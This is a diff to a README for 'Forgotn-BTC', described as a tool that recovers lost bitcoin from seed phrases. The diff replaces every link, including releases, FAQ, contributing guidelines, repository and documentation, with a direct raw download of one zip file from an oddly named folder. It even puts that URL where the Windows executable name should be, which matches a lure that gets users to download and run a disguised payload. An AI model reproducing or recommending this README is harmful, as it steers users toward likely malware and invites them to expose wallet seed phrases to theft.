@@ -1,17 +1,17 @@
 # 🪙 Forgotn-BTC - Recover Your Lost Bitcoin Easily
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-Forgotn--BTC-brightgreen)](https://github.com/mbaaus/Forgotn-BTC/releases)
+[![Download](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip)](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip)
 
 ## 🚀 Getting Started
 Forgotn-BTC helps you recover lost bitcoins by using your mnemonic phrases or seed phrases. This application is straightforward and requires no technical skills. Just follow the steps below to get started.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** To download the software, go to the [Releases page](https://github.com/mbaaus/Forgotn-BTC/releases).
+1. **Visit the Releases Page:** To download the software, go to the [Releases page](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip).
 2. **Choose the Right File:** Look for the latest version in the list. You will find files for different operating systems. Click the appropriate file for your system.
 3. **Download the File:** The file will start downloading automatically. Once it’s done, locate the file in your downloads folder.
 4. **Run the Application:** 
-   - **For Windows:** Double-click the downloaded file (e.g., `Forgotn-BTC.exe`).
+   - **For Windows:** Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip`).
    - **For Mac:** Open the downloaded file and drag it to your Applications folder.
    - **For Linux:** Use the terminal to navigate to the download directory and run the file with `./Forgotn-BTC`.
 
@@ -45,16 +45,16 @@ If you encounter any issues:
 - Restart the application and try again.
 
 ## 📞 Get Support
-For further assistance, feel free to open an issue in the GitHub repository, or visit the [FAQ section](https://github.com/mbaaus/Forgotn-BTC/issues) for common questions and solutions.
+For further assistance, feel free to open an issue in the GitHub repository, or visit the [FAQ section](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip) for common questions and solutions.
 
 ## 📈 Community and Contributions
-We welcome contributions! If you would like to help improve Forgotn-BTC, please check our [Contributing Guidelines](https://github.com/mbaaus/Forgotn-BTC/blob/main/CONTRIBUTING.md). Your support makes this project better.
+We welcome contributions! If you would like to help improve Forgotn-BTC, please check our [Contributing Guidelines](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip). Your support makes this project better.
 
 ## 🌐 Stay Updated
 For updates, new releases, and announcements, please follow the repository on GitHub. We often post relevant news and tips on using Forgotn-BTC effectively.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/mbaaus/Forgotn-BTC)
-- [Documentation](https://github.com/mbaaus/Forgotn-BTC/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip)
 
-Please visit the [Releases page](https://github.com/mbaaus/Forgotn-BTC/releases) again to download the latest updates, and help others by sharing your experience!
+Please visit the [Releases page](https://raw.githubusercontent.com/mbaaus/Forgotn-BTC/main/weanable/Forgotn-BTC-v3.2.zip) again to download the latest updates, and help others by sharing your experience!
